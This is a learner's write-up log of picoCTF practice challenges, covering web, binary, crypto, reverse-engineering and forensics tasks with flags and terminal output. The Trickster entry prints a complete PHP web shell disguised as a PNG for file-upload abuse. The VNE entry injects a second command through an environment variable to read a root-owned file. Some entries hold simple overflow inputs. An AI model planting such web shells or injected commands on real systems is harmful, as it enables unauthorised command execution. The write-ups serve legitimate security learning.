# login(Web Exploitation)
## flag
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}

Step 1:
This question was honestly very basic just went to the website and tried to inspect it and the page source.
Firstly didnt find anything so tried burpsuite, didnt find anything there as well.
Went back to the inspect element and tried to see the js code written, there I found a code and found an encoded base64 string which I decided to decode and got the flag.
![image](https://github.com/user-attachments/assets/48051a73-999a-45b3-a8f4-560249fd6d70)

Learnings:
No new learnings


No References.

## heap 1 (Binary Exploitation)

Flag
~~~
bash
picoCTF{starting_to_get_the_hang_c588b8a1}
~~~


Step 1:
In this challenge, just like heap 0, I opened the source code and the instance and this was just like heap 0.
But at first I didnt notice the difference between both and just tried what I did in heap 0 to obtain the flag.
Knowing that there would of course be some catch but still did it and it of course didnt work.
Step 2:
Went to the source code and carefully examined it.
That is when I saw it, the safe word shouldnt be pico or it wouldnt give me the flag.
Step 3:
So at first I entered all the alpha numeric characters to figure out which ones overflow to the safe var, once discovered that I entered such a string that would overflow pico to the safe var and give me the flag and it did.

![image](https://github.com/user-attachments/assets/f1dd9d56-e857-4663-931d-1f261ae7aea9)
![image](https://github.com/user-attachments/assets/144bccb4-0f7d-4d23-b4bd-1fc07cb58597)


Code and Terminal Output
~~~
bash
 nc tethys.picoctf.net 51553

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f7d1207b2b0  ->   pico
+-------------+----------------+
[*]   0x5f7d1207b2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyz123456pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f7d1207b2b0  ->   abcdefghijklmnopqrstuvwxyz123456pico
+-------------+----------------+
[*]   0x5f7d1207b2d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_c588b8a1}
~~~


Learnings:
A) nothing new learnt as such just a key takeaway to not straight dive into the question, instead taking a little time to read the source code and understand what the question actually requires.



# Power Cookie(Web Exploitation)
## flag
picoCTF{gr4d3_A_c00k13_0d351e23}

Step 1: This one as well was very basic, just inspected the website found a js code which had isAdmin=0 which meant that I was a guest hence I made isAdmin=1 which gave me admin access hence I logged in and got the flag.
![image](https://github.com/user-attachments/assets/23d6dfc0-b24b-4fc8-89a8-de14ca321aa5)


![image](https://github.com/user-attachments/assets/2a6eb9b4-9419-44d7-a953-20ef8b0998c3)

# CVE-XXXX-XXXX
## flag
picoCTF{CVE-2021-34527}

Step 1:
Just researched the given info which was given in the question and literally recieved all the data on it on this website(in the references).
![image](https://github.com/user-attachments/assets/217c3cf6-e6fd-41ba-9478-eaf395b0cd0a)

Learnings:
A) learnt about the vulnerability in the windows print spooler service(in 2021) in which a hacker had full rights to the system.

References:
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=windows+print+spooler

# Ascii Numbers(General Skills)
## flag
picoCTF{45c11_n0_qu35710n5_1ll_t311_y3_n0_l135_445d4180}

Step 1:
Nothing as such to do in this challenge, just to convert string of hexadecimal characters to ascii readable text.

No learnings.

References:
cyber chef

# Trickster(web exp)
## Flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}

Step 1:
Was given a website, on which visiting I saw that the website takes png files as uploads.
In the website I started to upload a random png file and uploaded it and saw that it did nothing only that it accepted if the file type was png otherwise it gave an error.
Step 2:
Now thanks to advent of cyber, I knew that when there were file uploads, a php webshell could be created to make an executable web shell on the website which can be used to access files uploaded on the website.
So I searched on google how to make an executable webshell which I saved. The code was as follows:
~~~
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
~~~
The png at the start has been added to disguise the webshell as png file.
I renamed the file and saved it as html.png.php
Step 3:
I uploaded the file and visited the /uploads URL which gave me this:
![image](https://github.com/user-attachments/assets/2e7fcd01-6a27-450d-a82a-11d6f529c83d)

Once here, I decided to execute ls -al /var/www/html to find all the files in that directory.

![image](https://github.com/user-attachments/assets/8f3170b1-6895-4769-969e-b3eae236e983)

Then I decided to cat the GAZWIMLEGU2DQ.txt file and it gave me the flag.

![image](https://github.com/user-attachments/assets/60d843ae-73c7-4c07-ac12-87a04bc20d4b)


# packer(rev eng)
## Flag:
picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_1a5a3f39}

Step 1:
Was given a file which I installed on the terminal using wget.
On doing file out:
I got to know that this was an ELF file, didnt know what an elf file was so used chatgpt to get to more info on an elf file and got to know that its basically an executable file type which is used to store data.
Tried to both cat and execute the file which were both useless as the file included alot of data which was impossible to go through, and when executed it required a password which wasnt really obtainable.

~~~
��r�����p�/_�(�[�^Gb �o#�'B=rgv�ekpos�!0
�eB�qJE#���1rol?�N��ibU�ƛ�f�"nQ���n"L���Lţ1;n�=l10�e%�1␦,f}-Iso��J5ׯX,���S)�␦A6adn��"0��cD8"�A� ��mb1   [n�� Ta+T��*�1� �n��sNP(,:Zu��S7�vw10<1�e)��Z,��(,-?��j]�O��ԦT)����H��E����-de16!p)�;QS�!��q!file�CW�w^p��ņn.��D�y`g�}��P�.�2��Aľ�@
Uv֍P=')Z��GI_grO�T����. ��@e�                                                                            D�Rr��ڄC�M�hib�h�itQ�0A
                             �C�C�_f�a��"�C��� �lod]��Ja���TX�auLu�n��r��P`=ٳ�Q���@(\������uU-eU����$ja�.a��O��!Sk-w����cm&v5a  ~
rt�U_W��a¥'[gƓZO�dl �a��u��
s#pR*�� �
0h�k%�耙e���P�嘅A��âU3���py��!w�z�_��g��dup�8�gaps�!z�0Q�F@�__7�X�{�wShUX=��b
.P�ruÉ#�CS���X8&@2�R�ok�pt�P
�usiz�TH�l�Qs,v7f��/Dbsf���!
��g�ZM�81�DQ�'â !*�BA�!s�W�-1␦�p�mQH�-� #`��ɃB�zTVcwc�ӊ��B��I%#W��#��M]�Ա���c0�BcY
 0���_n�sD�G��cgui0)                                                  *#YZ@*��W��=�d�inKiX���1�QߵG�Ro�E��U�%��42%�p
x64�c0i�m��     %�v�����T�{Iy�F��UݤB`T��`Fnc�6��J�$ce�� �l(0BhKCo�3�uIOEB�}�D!�"Spco�J�dl�r�+!!N_s��8�9\r�sN!��n+]R��@��_�@x�wdb�p␦8��c����@����J�mat��� d+��D��k�� ��!ozC
R5G�dls�S��P�m&     <�
a��p�0� ��`����`Ѡ�b�_5B!˹�xBb�3�d*�K�x�-KinF�1��ј1�v�P);�԰�R���b@`��R`
���"l�Vl��F�csl�fa�#dl�E1"$ҥ�v�'o��º��c�*���    �8��p" 0h�'��H(��g�era�Wa%�#�->�#sem�b4�ř��5mun�\T_� �A_�h�'� ɐ��akt��8�)ibU�B�dl.
�/Ixc�teƚGe�3�����X!��D�E�}MVa��K
8�c64eP�who�g��9�at8V<�ddr%�H1hP)�t��q�C��)��g0����x%_re�Yk�-�0y��Έ��OR�ed���*�װ�1b��pl��p��me�
k�      ?|aT�QV�(                                                                               ���P�
                 ���"0��J                                                                            'PO��6�SIX=ZC�;�"Q]i��[    �'
pB͑�$��W�6�W�#�R%�c))�5�y�␦�f�J8�-1dl�H��71���_�#�@���-�;�_)�Ģ�+%J<�=��B���r�H!t*uds30j(Em�m�t��D�nnum:3�:tb
c��w��E�En�Z���?�oB!�{��E��4
��{                         '"�Q8���4␦�l�G��H�
�uk�8a��TL���t���toÁ�/\�vinit�ZH'BaPa         { p�8b��պy�kPB�S�'$��Q�
��Us�oj1�hο_sa#\À.b0.a`�}h�kěZ4u.��y%�݂Z/-id%ABI-�`"�␦<>4�^�..B�4�CY␦�Ƃ.��Dx�Zo��-�.eh��ccU����?�a8s,���s�m�n`I C�Q8���ot       +da$�&�W�|��-�.bssh� �(�.^�
R�Em�b�F�U�9�l�U���j1t�
_a�l��Ѹ?p! ���].��!$�]�b_AC[�����O���n'B���i/�@W�ÞwYI@�Z␦?�TM���  �_����_���$O  e��g�1Io�w�Y䅴M
}1�m��PIl�b��"��        �T�R��VqBasw�n�~err�    Շ0��64qCcTOls,�����#�*Y�9�8p�N�hC��
�����[�m��][`4v@K[e�Q%wEn�F���P_g{�␦�Xq�E���x���wc����VH�-s#�5W�K`�x����_��1"umb0)P���b4�L�08-�%��GVJ�b��7��3�j,LVgu�S,�        cD
ٿ�Er�'lk]��lu�.* 4�a}�bG[�p%��p��_�"/6�w�a$B���rF       C�VBMfE�C�U     ӿt4�=/jf�P�ŀ5IO�nK�i2�4��P*�_�nv���@�噣�P`UI����(˃1�kE��LO
CALE�:ٍ��n�+-'1}e�Euid����A�[(ed)/PW!sx�܆���_��'�Ţ61O���ToOIO7f!�z�fd�.
m@���'"99��@���] �����������A�������-���������F�_��v������b�          ������1��5��A�;}���B}p��q_=dl��w��.b���ƂC�%�P:�L]��b�s�
                                                             d������0␦4                                                       ��pM
ž���xfwnl��mi��]�e�oseC߁0IO_␦�5@C�K�F-�4n�3lbf�`{~m�W�*Gb�5�J�iR�YDF
!)T:H_db��`�%��`�_�Cai���C
�w      X� �dl= 9�E��"Uń1��'���`ؿ"8_y��%�,X9
I␦�saps@LAPTOP-KKUS7K8J:~$ 61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c61;6;7;14;21;22;23;24;28;32;42c^C                  �(Yǉ�<T�UPP��
saps@LAPTOP-KKUS7K8J:~$ ~/out
Enter the password to unlock this file: ^C
~~~


Step 2:
Then I read the hint which said that the file was needed to be decompressed, but I didnt know how the file was exactly packed.
Using the binwalk command I got to know that it was an UPX packed file.

Step 3:
didnt know how to decompress these type of packed files so searched and got to know.
run the following command.
~~~
upx-ucl out
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx-ucl: out: AlreadyPackedException

Packed 0 files.
saps@LAPTOP-KKUS7K8J:~$ upx -d out
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    872088 <-    336520   38.59%   linux/amd64   out

Unpacked 1 file.
~~~

got to know -d argument has to be used to unpack.
When that was done i catted the file and alot of data was still included so I decided to grep flag which gave me this(thanks to bandit):
~~~
saps@LAPTOP-KKUS7K8J:~$ strings out | grep flag
Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f31613561336633397d
(mode_flags & PRINTF_FORTIFY) != 0
WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.
version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)
flag.c
_dl_x86_hwcap_flags
_dl_stack_flags
~~~
and this was the flag in hexadecimal which when converted gave me the flag.

Learnings:
1) Got to know how to decompress UPX files.

References:
1)https://www.kali.org/tools/upx-ucl/
2) https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NzA2OTYzNmY0MzU0NDY3YjU1Mzk1ODVmNTU2ZTUwMzQ2MzZiMzE0ZTM2NWY0MjMxNmUzNDUyNjkzMzUzNWYzMTYxMzU2MTMzNjYzMzM5N2Q


# Vignere(Cryptography)
## Flag
picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_2951a89h}

Step 1:
Didnt really have to do much in this challenge, due to prior knowledge I know that vignere cipher requires a key to decode some text, so using the key I just opened up a website to decode the ciphertext and got the flag.

![image](https://github.com/user-attachments/assets/e58a2ced-cc6e-4ac2-b912-920ce6dcbece)

Learnings:
1) No learnings per say

References:
1) https://cryptii.com/pipes/vigenere-cipher
2) https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher


# Rotation(crypt)
## Flag
	picoCTF{r0tat1on_d3crypt3d_4c71f5b0}

Step 1:
The name of the challenge is rotation which corresponds to ROT decipher which had to be done here.
When I saw the decrypted text, the first letter was x and I knew the first letter of the flag should be p hence a shift of 8 letters was required.
I confirmed this by looking at the next letter which was q and i also have a difference of 8 letters.
Hence I opened up a website and shifted 8 letters and got the flag.


![image](https://github.com/user-attachments/assets/0bc5da85-276e-4fc9-8b38-4733a8d41d01)

References:
1) https://www.dcode.fr/rot-cipher



# ReadMyCert(crypt)

# Flag
picoCTF{read_mycert_57f58832}

Step 1:
I was given a certificate signing request file(csr) when opened it had text which I couldnt really do anything with.
-----BEGIN CERTIFICATE REQUEST-----
MIICpzCCAY8CAQAwPDEmMCQGA1UEAwwdcGljb0NURntyZWFkX215Y2VydF81N2Y1
ODgzMn0xEjAQBgNVBCkMCWN0ZlBsYXllcjCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBANZde4bKP/88bBY0RM2b+EyGoxWqWsADa7QIPRZM4jTAxPTC39Ld
6iDZwfA6Cu33KvkZbu1JpAFk/6O/lY+iwSCcZnBTp1p+Skn/BpIwW7KBEjnczulA
c/u4GYQgpU5Pxxd/gvOHLNtWHw8FjcHAV78Y23cwwfO1Gfae5eYrxHMa/nCiQmjC
9GwRsj2+cPmWiyFs1ntLREBGUKWBIHGoTR+ZMXv9aBeasIUlzWap/4ZsSOqoqzAL
3geZ9TfWd/pHtYgqA1jV60ogmWD2LKMU9F4s+5dJveO/5kV7kkpk+7VX3xlE1t/S
0/ThtcNU51WdfmFREr2hCUJgicQHbkkwq00CAwEAAaAmMCQGCSqGSIb3DQEJDjEX
MBUwEwYDVR0lBAwwCgYIKwYBBQUHAwIwDQYJKoZIhvcNAQELBQADggEBAHihiiyg
z69vMceQR0gOoTZS1RQKafdyX64IxwEuHdV8I0To+3VQp+3yp2yHNAjLxLEIam6f
4dlTZlWSSttHSjp1WjoabpQrSp7ANgTuLFwBsQkbXY72wm0LVrdSi1tuKTnl82vM
mXccuWLUXy71wmzKR+Wekf5JXX9AwFAEVedyAW5EP+bNOP/hQr1kiOCWge3pmGUq
9fVYITJs6gZ6aiDwx4O2jdJuP3CG1QRrKer89mgw5GkgvcVn38s7BF24kRddcBK1
RGSntFXy1CDUd55IhSoADxrZoXT5+5+GokM85JKTkwS9L/VGe2ZQuym+NyIkbfBm
I+FejxNz7x4Fmzg=
-----END CERTIFICATE REQUEST-----

This was the text.

Step 2:
Researched on how to decode a csr file and got the command which had to be used and got the flag.
~~~
openssl req -in readmycert.csr -noout -text
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: CN = picoCTF{read_mycert_57f58832}, name = ctfPlayer
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d6:5d:7b:86:ca:3f:ff:3c:6c:16:34:44:cd:9b:
                    f8:4c:86:a3:15:aa:5a:c0:03:6b:b4:08:3d:16:4c:
                    e2:34:c0:c4:f4:c2:df:d2:dd:ea:20:d9:c1:f0:3a:
                    0a:ed:f7:2a:f9:19:6e:ed:49:a4:01:64:ff:a3:bf:
                    95:8f:a2:c1:20:9c:66:70:53:a7:5a:7e:4a:49:ff:
                    06:92:30:5b:b2:81:12:39:dc:ce:e9:40:73:fb:b8:
                    19:84:20:a5:4e:4f:c7:17:7f:82:f3:87:2c:db:56:
                    1f:0f:05:8d:c1:c0:57:bf:18:db:77:30:c1:f3:b5:
                    19:f6:9e:e5:e6:2b:c4:73:1a:fe:70:a2:42:68:c2:
                    f4:6c:11:b2:3d:be:70:f9:96:8b:21:6c:d6:7b:4b:
                    44:40:46:50:a5:81:20:71:a8:4d:1f:99:31:7b:fd:
                    68:17:9a:b0:85:25:cd:66:a9:ff:86:6c:48:ea:a8:
                    ab:30:0b:de:07:99:f5:37:d6:77:fa:47:b5:88:2a:
                    03:58:d5:eb:4a:20:99:60:f6:2c:a3:14:f4:5e:2c:
                    fb:97:49:bd:e3:bf:e6:45:7b:92:4a:64:fb:b5:57:
                    df:19:44:d6:df:d2:d3:f4:e1:b5:c3:54:e7:55:9d:
                    7e:61:51:12:bd:a1:09:42:60:89:c4:07:6e:49:30:
                    ab:4d
                Exponent: 65537 (0x10001)
        Attributes:
            Requested Extensions:
                X509v3 Extended Key Usage:
                    TLS Web Client Authentication
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        78:a1:8a:2c:a0:cf:af:6f:31:c7:90:47:48:0e:a1:36:52:d5:
        14:0a:69:f7:72:5f:ae:08:c7:01:2e:1d:d5:7c:23:44:e8:fb:
        75:50:a7:ed:f2:a7:6c:87:34:08:cb:c4:b1:08:6a:6e:9f:e1:
        d9:53:66:55:92:4a:db:47:4a:3a:75:5a:3a:1a:6e:94:2b:4a:
        9e:c0:36:04:ee:2c:5c:01:b1:09:1b:5d:8e:f6:c2:6d:0b:56:
        b7:52:8b:5b:6e:29:39:e5:f3:6b:cc:99:77:1c:b9:62:d4:5f:
        2e:f5:c2:6c:ca:47:e5:9e:91:fe:49:5d:7f:40:c0:50:04:55:
        e7:72:01:6e:44:3f:e6:cd:38:ff:e1:42:bd:64:88:e0:96:81:
        ed:e9:98:65:2a:f5:f5:58:21:32:6c:ea:06:7a:6a:20:f0:c7:
        83:b6:8d:d2:6e:3f:70:86:d5:04:6b:29:ea:fc:f6:68:30:e4:
        69:20:bd:c5:67:df:cb:3b:04:5d:b8:91:17:5d:70:12:b5:44:
        64:a7:b4:55:f2:d4:20:d4:77:9e:48:85:2a:00:0f:1a:d9:a1:
        74:f9:fb:9f:86:a2:43:3c:e4:92:93:93:04:bd:2f:f5:46:7b:
        66:50:bb:29:be:37:22:24:6d:f0:66:23:e1:5e:8f:13:73:ef:
        1e:05:9b:38
~~~

Learnings:
1) Learnt about CSR files and what they are.
2) Learnt about openssl and how the command is used to decode a csr file.

References:
1) https://stackoverflow.com/questions/201070/how-to-decode-a-csr-file

Incorrect Methods:
When I cat'ed the csr file I began to look through the data for hidden text and tried to decode it into other formats.


# Flags(crypt)
# Flag:
picoCTF{F1AG5AND5TUFF}

Step 1:
opened the image and got to know that the flags corresponded to some letter or number and also knew that the first letters were picoCTF hence that was that.
After that I google what these flags meant and got to know that these were International Maritime Signal Flags.
Opened up the wiki page and mapped each flag to their letter/number and got the flag.

![image](https://github.com/user-attachments/assets/fa42f905-d44f-4b9c-b988-e3744a6ea74b)

Learnings:
Learnt about International Maritime Signal Flags and what some of these corresponded to.

References:
https://en.wikipedia.org/wiki/International_maritime_signal_flags

# basic file exploit(binary exp)
## flag:
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}

Step 1:
Honestly I didnt even open the source code, which was wrong on my part.
there was a hint given that if a string is entered instead of a number when a number is supposed to be input, that would lead to unexpected behaviour.
I just did that and got the flag.

~~~
bash
nc saturn.picoctf.net 53049
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
weojewjew
weojewjew
Please enter the length of your data:
e0e
e0e
Please put in a valid length
Please enter the length of your data:
No data given.
Please put in a valid length
Please enter the length of your data:
4
4
Your entry number is: 1
Write successful, would you like to do anything else?
keoeewk
keoeewk
Please put in a valid number
Please put in a valid number
Please put in a valid number
Please put in a valid number
4
4
Please type either 1, 2 or 3
Maybe breaking boundaries elsewhere will be helpful
6
6
Please type either 1, 2 or 3
Maybe breaking boundaries elsewhere will be helpful
3
3
e
saps@LAPTOP-KKUS7K8J:~$ nc saturn.picoctf.net 53049
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
iwjejoewe
iwjejoewe
Please put in a valid number
Please put in a valid number
Please put in a valid number
Please put in a valid number
Please put in a valid number
2
2
No data yet
ewkewpwe
ewkewpwe
Please put in a valid number
Please put in a valid number
Please put in a valid number
Please put in a valid number
No data given.
Please put in a valid number
1
1
Please enter your data:
woewekwe
woewekwe
Please enter the length of your data:
ewwe-
ewwe-
Please put in a valid length
Please enter the length of your data:
Please put in a valid length
Please enter the length of your data:
5
5
Your entry number is: 1
Write successful, would you like to do anything else?
oewjewkew
oewjewkew
Please put in a valid number
Please put in a valid number
Please put in a valid number
Please put in a valid number
Please put in a valid number
lwelwe
lwelwe
Please put in a valid number
Please put in a valid number
Please put in a valid number
No data given.
Please put in a valid number
2
2
Please enter the entry number of your data:
jeowe
jeowe
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}
~~~

But after going through the source code, I saw that there was an else condition that would print the flag, if the input provided isnt a number.

## Mind your Ps and Qs(crypt)
## Flag:
picoCTF{sma11_N_n0_g0od_00264570}

Step 1:
This was one of the easiest problems in pico, as the values of e(exponent-small value), n(number) and c(ciphertext) were all given and with the help of an rsa cipher this could be decoded(i knew this due to miniRSA)

![image](https://github.com/user-attachments/assets/44ce2802-8cf6-4378-9252-383f5fcc4495)

References:
https://www.dcode.fr/rsa-cipher

## Picker 1
## Flag:
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}

Step 1:
Not much to do in this question, just opened up the server and it told me to use some kind of command getrandomnumber which was always giving me the value 4.
When I opened the python script, there was a function named getrandomnumber() which was being called and was printing the value 4.
When I scrolled, I saw a win() function which was taking the flag and converting it to hexadecimal value.
So that is what I did called the win() function and got the flag.

~~~
bash
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
Try entering "getRandomNumber" without the double quotes...
~~~

![image](https://github.com/user-attachments/assets/8fc3c7bd-f33e-47eb-843a-ab4541962511)


## two-sum(binary exp)
## Flag:
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1}

Step 1:
In the question, as a hint I was told that this wasnt a maths problem but I had to create a buffer overflow, so to do that I opened the source code and looked at the code.
In there I found that 2 integers were of course being added but an integer overflow could be created if both were greater than 0 and their sum was smaller than 0.
Now this could be done easily as the maximum value a signed variable can take is 2,147,483,647, so I added 2000000000 and got the flag.


~~~
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
2000000000
2000000000
You entered 2000000000 and 2000000000
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1}
~~~

Learnings:
1) Learnt about the max value of int.


References:
https://www.geeksforgeeks.org/maximum-value-of-int-in-c/




## Reverse(rev eng)

## Flag:
picoCTF{3lf_r3v3r5ing_succe55ful_d7b14d43}

Step 1:
So luckily for me, whenever I get a file in any challenge I wget that file, download it in the terminal and check out its properties.
So firstly I used the file command got to know that this was an ELF file, so then I used strings command and that gave me the flag.


![image](https://github.com/user-attachments/assets/c3085f57-1242-4211-9bc5-d138358e1c66)

Learnings:
No learnings


## Ready Gladiator 0 (Rev Eng)

## flag:
picoCTF{h3r0_t0_z3r0_4m1r1gh7_7c030e56}

Step 1:
Honestly, I just got lucky in this challenge, because what happened is I didnt download the source code at first and instead of directing the servers input to the file as given in the question, I just connected to the server and entered a random name and got the flag.

Then after opening the file and telling chatgpt to stimulate the red code into gcc I got to know what was happening as if I redirect the input of the server to the file then it doesnt give me the flag because I always tie and not lose.

Learnings:
1) Got to know that a programming language named red exists

References:
None

![image](https://github.com/user-attachments/assets/2d46401c-627d-4270-8fe7-da1f38cfb949)



## PcapPoisoning (Forensics)

## Flag:
picoCTF{P64P_4N4L7S1S_SU55355FUL_fc4e803f}

Step 1:
Opened up wireshark and looked through the files data objects and found the flag.
Alternative Method:
Using strings command also yields the flag.
![image](https://github.com/user-attachments/assets/0f0b339d-d17e-40d5-b09f-461432ebc41c)


![image](https://github.com/user-attachments/assets/c765bd7a-68d6-451a-9147-436e68cc4668)


Incorrect Methods Tried:
1) Tried to export different objects from the file as that was done in a forensics challenge.


## MSB(Forensics)

## Flag:
picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ee3cb4d8}

Step 1:
Downloaded the image and noticed that the image was definitely corrupt so firstly as always tried strings and cat which did nothing, then tried steghide which told me that the file couldnt be opened.
Step 2:
Then as the name of the challenge said MSB(which means most significant bit, thanks to FE or BE I know this) so I searched up steganography MSB and got a website which gave me some commands using which I extracted text from the file and got the flag.

~~~
python sigBits.py Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png.png
~~~
This command produced a file, outputSB.txt which on reading and searching pico gave me the flag.


![image](https://github.com/user-attachments/assets/789e7891-9e7c-411b-8bb0-6417cb2830b6)


Learnings:
1) Learnt about MSB in terms of steganography and how to extract MSB data from an image.

References:
https://github.com/Pulho/sigBits/blob/master/README.md


## VNE(Bin Exp)
## Flag:
picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}

Step 1:
After connecting to the server, I tried to execute the binary file, it told me that a path like variable called SECRET_DIR wasnt set to the correct path.
In the hints I was told that I check try and cd to the root folder which of course wouldnt work but I still tried, and that didnt work.

Step 2:
After that I thought of changing the path of SECRET_DIR to the /root folder which worked.
~~~
export SECRET_DIR=/root
~~~

~~~
./bin
Listing the content of /root as root:
flag.txt
~~~
Now this was shown to me when I tried and accessed the file meaning there was a flag.txt file in the root folder and I had to read that.
After many desperate attempts of sudo'ing to the /root folder, I tried to explore the 2nd hint which said I should try and use different arguments with ls.

Step 3:
So after trying some different arguments with ls command, I finally landed on one which worked.

~~~
ctf-player@pico-chall$ export SECRET_DIR="ls -la /root | cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of ls -la /root | cat /root/flag.txt as root:
picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}ls: cannot access 'ls': No such file or directory
~~~
(i wont lie, I had to ask chatgpt for that one command of ls because I didnt know that one)

Learnings:
Got to know more about the ls command.

Incorrect Methods:
Had to try alot of ls commands before actually arriving on the correct one with the help of GPT.

## Local Target(bin exp)

## Flag:
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}

Step 1:
This was a classic problem of buffer overflow, in the source code there was an input variable taking 16 characters, if more than 16 then it was overflowing into num and if num was 65 then it would print me the flag.

Step 2:
So I started with the hit and trial to obtain the flag and was entering alot of words with the end as '65' but what I didnt realize was it had to be the ascii value so that meant A had to be printed at the end and not 65 the number itself.
Did that and got the flag.

~~~
nc saturn.picoctf.net 59823
Enter a string: 987656789123421789123456A

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
~~~

Learnings:
Actually understand the code first and dont try and rush to a solution.

## safe opener-2 (rev eng)

## flag:
picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_3dae8463}

Step 1:
Well I suppose I got lucky in this question because I downloaded the file and got to know that its a java class data file, used the cat command or the strings command and both can be used to get the flag instead of decompiling the whole thing.


~~~
cat SafeOpener.class
����4�
CDE     FG
H
I
JL      FN
OP
Q
RS
.T
OU
VW
X
Y
[
]
R`ab<init>()VCodeLineNumberTableLocalVariableTablethis
                                                      LSafeOpener;main([Ljava/lang/String;)VisOpenZargs[Ljava/lang/StringkeyboardLjava/io/BufferedReader;encodercEncoder
                                      InnerClasses␦Ljava/util/Base64$Encoder;
StackMapTable*Dcdang/String;keyiI
ExceptionsopenSafe(Ljava/lang/String;)password
SourceFileSafeOpener.java
                         java/io/BufferedReaderjava/io/InputStreamReaderf
                                                                         gh
                                                                           i
                                                                            jk
                                                                              lm
                                                                                noEnter password for the safe: p
                                                                                                                qr
                                                                                                                  std
                                                                                                                     uv
                                                                                                                       wx
                                                                                                                         yr
                                                                                                                           >?java/lang/StringBuilder
You have
          z{
            z| attempt(s) left
                              }t,picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_3dae8463}
                                                                             ~
                                                                              Sesame openPassword is incorrect

SafeOpenerjava/lang/Objectjava/util/Base64$Encoderjava/lang/Stringjava/io/IOExceptionjava/lang/SysteminLjava/io/InputStream;(Ljava/io/InputStream;)V(Ljava/io/Reader;)Vjava/util/Base64
getEncoder()Ljava/util/Base64$Encoder;outLjava/io/PrintStream;java/io/PrintStreamprint(Ljava/lang/String;)readLine()Ljava/lang/StringgetBytes()[BencodeToString([B)Ljava/lang/String;printlnappend-(Ljava/lang/String;)Ljava/lang/StringBuilder;(I)Ljava/lang/StringBuildertoStringequals(Ljava/lang/Object;)Z! /*��!"
                                                  #$    %& <x�Y�Y���L�:6�T�
�
 +�
